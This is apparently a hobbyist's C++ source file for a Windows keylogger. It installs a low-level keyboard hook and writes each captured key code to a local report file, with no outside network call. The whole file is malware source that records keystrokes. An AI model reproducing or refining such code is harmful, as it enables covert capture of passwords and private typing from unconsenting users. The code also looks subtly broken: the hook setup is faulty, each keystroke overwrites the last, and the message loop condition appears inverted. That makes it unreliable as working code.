#include <iostream>
#include <fstream>
#include <Windows.h>

HHOOK hkb;

LRESULT  CALLBACK KeyboardProc(int nCode, WPARAM wParam,
    LPARAM lParam)
{
    char ch;
    if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
    {
        std::fstream file("K:\\Programming\\keyLogger\\keyLogger\\keyLogger\\report.txt");

        file << wParam;
        file.close();
    }

    LRESULT RetVal = CallNextHookEx(NULL, nCode, wParam, lParam);
    return  RetVal;
}

BOOL installhook()
{
    hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, NULL, 0);

    return TRUE;
}

int main()
{
    FILE* file = fopen("K:\\Programming\\keyLogger\\keyLogger\\keyLogger\\report.txt", "w");
    fclose(file);
    installhook();

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


    UnhookWindowsHookEx(hkb);

    std::cout << "Done!\n";
    
	return 0;
}


